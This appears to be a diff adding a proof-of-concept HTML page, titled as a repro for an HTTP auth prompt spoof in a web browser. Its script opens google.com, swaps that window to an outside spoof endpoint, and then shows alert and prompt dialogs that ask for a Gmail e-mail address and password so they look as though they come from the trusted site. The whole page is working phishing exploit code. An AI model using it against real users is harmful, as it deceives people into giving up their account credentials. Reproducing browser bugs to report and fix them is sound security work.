@@ -1,0 +1,40 @@
+<html>
+<head>
+  <title>Combined HTTP Auth Prompt Spoof Repro</title>
+</head>
+<body>
+<script>
+(() => {
+    const button = document.createElement('button');
+    button.innerText = 'Reproduce Exploit';
+
+    button.addEventListener('click', async () => {
+        // open google first
+        const g = window.open('https://google.com', 'g');
+
+        // wait 2 seconds like original POC
+        setTimeout(() => {
+
+            // replace target window with spoof endpoint
+            window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
+
+            // wait 1 second, then execute prompts inside that window (old behavior)
+            setTimeout(() => {
+                try {
+                    g.alert('Go to gmail.com');
+                    g.prompt('E-mail', '');
+                    g.prompt('Password', '');
+                    g.alert('Welcome to Gmail.com');
+                } catch(e) {
+                    console.log('Browser blocked cross-origin prompts:', e);
+                }
+            }, 1000);
+
+        }, 2000);
+    });
+
+    document.body.appendChild(button);
+})();
+</script>
+</body>
+</html>
